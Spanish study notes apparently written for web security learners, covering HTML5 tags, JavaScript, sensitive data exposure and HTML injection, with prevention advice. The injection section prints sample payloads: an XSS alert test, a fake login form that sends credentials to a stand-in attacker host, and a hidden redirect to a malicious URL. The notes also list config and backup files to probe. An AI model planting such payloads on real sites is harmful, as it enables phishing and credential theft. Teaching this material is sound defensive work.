

# Estructura HTML5
## 1. El Esqueleto (Documento Raíz)
* `<!DOCTYPE html>`: Declaración obligatoria. Indica que el archivo usa **HTML5**.
* `<html lang="es">`: Nodo raíz que envuelve todo el contenido. El atributo `lang` define el idioma.

## 2. La Cabecera (`<head>`) - Configuración Invisible
* `<meta charset="UTF-8">`: Codificación de caracteres (evita errores con tildes y "ñ").
* `<title>`: Título que aparece en la pestaña del navegador.
* `<link rel="stylesheet" href="estilo.css">`: Vincula el archivo de estilos (CSS).
* `<script src="script.js"></script>`: Vincula lógica de programación (JavaScript).

## 3. El Cuerpo (`<body>`) - Contenido Visible
### A. Etiquetas Semánticas (Organización)
* `<header>`: Encabezado de la página o de una sección.
* `<nav>`: Bloque de enlaces de navegación.
* `<main>`: Contenido principal y único de la página (solo uno por archivo).
* `<section>` / `<article>`: Agrupaciones de contenido temático.
* `<footer>`: Pie de página (copyright, contacto, enlaces legales).

### B. Etiquetas de Contenido y Texto
* `<h1>` a `<h6>`: Títulos jerárquicos. El `<h1>` es el más importante.
* `<p>`: Párrafos de texto.
* `<ul>` / `<li>`: Listas con viñetas (desordenadas).
* `<ol>` / `<li>`: Listas numeradas (ordenadas).
* `<div>`: Contenedor genérico de bloque (usado para diseño/CSS).
* `<span>`: Contenedor genérico en línea (para estilo de palabras sueltas).

## 4. Elementos de Interacción (Clave para Ciberseguridad)
* `<a href="URL">Texto</a>`: Enlaces. El atributo `href` indica el destino.
* `<img src="ruta" alt="descripcion">`: Imágenes. El `alt` es vital para accesibilidad.
* `<form action="/enviar" method="POST">`: Define formularios de envío de datos.
* `<input type="text|password|email">`: Campos donde el usuario escribe. 
    * *Nota:* En pentesting, aquí es donde se prueban **XSS** e **Inyecciones**.

---
**💡 Tip de estudio:** Las etiquetas suelen ir por parejas (`<abrir>` y `</cerrar>`), pero algunas son "huérfanas" y se cierran solas, como `<img>`, `<br>` (salto de línea) o `<meta>`.

# JavaScript: La Lógica del Navegador

## 1. ¿Qué es y dónde vive?

* **Definición:** Es el lenguaje de programación que da interactividad a la web (el "cerebro").
* **Ejecución:** Corre en el **cliente** (tu navegador), no en el servidor. Esto es clave en ciber: puedes ver, modificar y debuguear el código JS de cualquier web desde la consola (`F12`).

## 2. Formas de Inclusión

* **Interno:** Dentro de etiquetas `<script> ... código ... </script>`.
* **Externo:** `<script src="archivo.js"></script>` (Lo más común).

## 3. Conceptos Clave (Sintaxis)

* **Variables:** `let nombre = "Juan";` o `const pi = 3.14;` (constantes).
* **Funciones:** Bloques de código reutilizables. 
  * *Ejemplo:* `function saludar() { alert("Hola"); }`
* **DOM (Document Object Model):** Es la interfaz que permite a JS "tocar" el HTML. 
  * *Ejemplo:* `document.getElementById("boton").innerText = "Clickeado";`

## 4. Eventos (Interacción)

JavaScript reacciona a lo que hace el usuario:

* `onclick`: Al hacer clic en un elemento.
* `onmouseover`: Al pasar el ratón por encima.
* `onload`: Cuando la página termina de cargar.

## 5. Foco en Ciberseguridad (⚠️ IMPORTANTE)

Como el código JS es accesible para el usuario, es el vector principal de varios ataques:
***XSS (Cross-Site Scripting):** Si una web permite inyectar JS malicioso, el atacante puede robar cookies o sesiones.
  
  * *Prueba clásica:* `<script>alert('Hacked')</script>`
* **Manipulación de Lógica:** Puedes usar la consola del navegador para cambiar variables en tiempo real (ej. cambiar el precio de un carrito o saltar una validación de formulario).
* **Sensitive Data:** A veces los desarrolladores olvidan contraseñas, claves de API o rutas ocultas dentro de los archivos `.js` comentados o en variables globales.

---
**💡 Tip de estudio:** Siempre que audites una web, mira la pestaña **"Sources"** (Fuentes) en las herramientas de desarrollador para leer los archivos JS. Es donde se esconde la verdadera "magia" (y los errores) de la página.

# Sensitive Data Exposure (Exposición de Datos Sensibles)

## 1. ¿Qué es?
Ocurre cuando una aplicación web no protege adecuadamente información crítica, dejándola accesible a usuarios no autorizados. No es un "hackeo" de romper código, sino de **encontrar algo que ya está ahí pero no debería verse.**

## 2. ¿Dónde buscar? (Vectores comunes)
* **Comentarios en el código:** Desarrolladores que olvidan notas como `` en el HTML.
* **Archivos de configuración:** `/config.php`, `/.env`, `/settings.json`. Pueden contener credenciales de bases de datos.
* **Rutas olvidadas:** Paneles de administración (`/admin`, `/backup`) que no tienen autenticación.
* **Copias de seguridad:** Archivos como `database.sql.bak` o `respaldo.zip` dejados en la raíz del servidor.

## 3. Archivos Clave para Ciber-Investigación
* **`robots.txt`**: Archivo para buscadores (Google). A menudo los desarrolladores listan aquí las carpetas que **no** quieren que se indexen (ej: `/admin_login`), dándole al atacante un mapa de sitios sensibles.
* **`sitemap.xml`**: Mapa de todas las URLs de la web. Puede revelar páginas que no están enlazadas en el menú principal.
* **Cabeceras HTTP**: A veces revelan la versión exacta del servidor (Apache, Nginx) o del lenguaje (PHP 5.4), permitiendo buscar exploits específicos para esas versiones.

## 4. Riesgos Principales
* **Robo de PII:** Información de Identificación Personal (nombres, emails, tarjetas).
* **Escalada de Privilegios:** Encontrar una clave de admin en un archivo JS o un comentario.
* **Compromiso Total:** Si se filtran las llaves de la API o la conexión a la base de datos.

## 5. Prevención (Defensa)
* **Cifrado:** Los datos deben estar cifrados tanto en reposo (disco) como en tránsito (HTTPS).
* **Eliminación de metadatos:** Limpiar archivos de comentarios y logs antes de subirlos a producción.
* **Control de acceso:** No confiar en la "seguridad por oscuridad" (creer que porque no hay un enlace, nadie encontrará la carpeta).

---
**💡 Tip de estudio:** En ciberseguridad, la fase de **Reconocimiento** consiste en un 80% en buscar estas exposiciones antes de intentar cualquier ataque complejo. "Mirar donde otros no miran".

# HTML Injection (Inyección HTML)

## 1. ¿Qué es?

Es una vulnerabilidad que ocurre cuando una aplicación web **no sanea la entrada del usuario** y la muestra directamente en la página. Esto permite a un atacante "inyectar" sus propias etiquetas HTML en el sitio web de otra persona.

## 2. Tipos de Inyección

* **HTML Injection Reflejado:** El código inyectado solo aparece en la respuesta inmediata (ej. en un mensaje de error o en un parámetro de búsqueda en la URL).
* **HTML Injection Persistente (Almacenado):** El código se guarda en el servidor (ej. en un comentario de un foro o en el nombre de perfil). Cada usuario que visite esa página verá la inyección. Es el más peligroso.

## 3. Objetivos del Atacante

A diferencia del XSS (que busca ejecutar código), la inyección HTML suele buscar:
* **Defacement:** Cambiar la apariencia visual de la web (borrar contenido, poner mensajes ofensivos).
* **Phishing / Ingeniería Social:** Inyectar un formulario falso de login sobre el real para robar credenciales.
* **Daño de reputación:** Meter enlaces a sitios maliciosos o descargar malware automáticamente.

## 4. Ejemplos de Carga (Payloads)

* **Básico:** `<h1>Has sido hackeado</h1>` (Cambia el estilo).
* **Phishing:** 
```html
	<form action="[http://ataca.nte/robo](http://ataca.nte/robo)">
      <h3>Inicia sesión para continuar</h3>
      <input type="text" name="user"><input type="password" name="pass">
      <input type="submit" value="Login">
    </form>
```
* **Redirección invisible:**  `<meta http-equiv="refresh" content="0; url=http://malicioso.com">`



## 5. ¿Cómo se previene?

* **Validación de entrada:** No permitir caracteres como `<`, `>`, `/`, `"`.
* **Output Encoding:** Convertir caracteres especiales en entidades HTML (ej. convertir `<` en `&lt;`). Así, el navegador muestra el símbolo pero no lo interpreta como código.
* **Saneamiento (Sanitization):** Usar librerías que limpien el HTML del usuario, dejando solo etiquetas seguras (como `<b>` o `<i>`).

---
**💡 Tip de estudio:** La diferencia clave con el XSS es que la Inyección HTML se limita a cambiar lo que se **ve** y cómo se **estructura** la página, mientras que el XSS busca **ejecutar acciones** (JavaScript).